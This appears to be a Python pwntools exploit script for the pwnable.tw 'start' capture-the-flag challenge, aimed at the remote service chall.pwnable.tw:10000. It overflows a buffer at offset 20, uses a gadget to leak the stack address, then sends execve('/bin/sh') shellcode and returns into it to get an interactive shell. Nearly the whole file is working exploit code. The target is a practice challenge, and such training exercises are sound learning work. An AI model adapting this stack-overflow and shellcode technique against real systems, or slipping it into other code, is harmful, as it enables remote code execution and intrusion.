from pwn import *

exe = "./start"


gdbscript = '''
b *_start+60
c
'''

elf = context.binary = ELF(exe, checksec=False)


#p = gdb.debug([exe], gdbscript)
p = remote('chall.pwnable.tw', 10000)
pop_esp = 0x0804809d #: pop esp ; xor eax, eax ; inc eax ; int 0x8
gadget1 = 0x08048087


offset = 20
payload = flat({
    offset: [
        gadget1,
    ]
})

p.sendafter(b"CTF:", payload)

leak = p.recv()[:4]
esp = u32(leak)
print("leak: ", hex(esp))


# In x86-32 parameters for Linux system call are passed using registers. %eax for syscall_number. %ebx, %ecx, %edx, %esi, %edi, %ebp are used for passing 6 parameters to system calls.
shellcode = asm("\n".join([
    'push %d' % u32(b"/sh\x00"),
    'push %d' % u32(b'/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, %d' % constants.SYS_execve,
    'int 0x80',
]))


payload = flat({
    offset: [
        esp+20,
        shellcode,
    ]
})

# Back to start again
p.send(payload)
p.interactive()
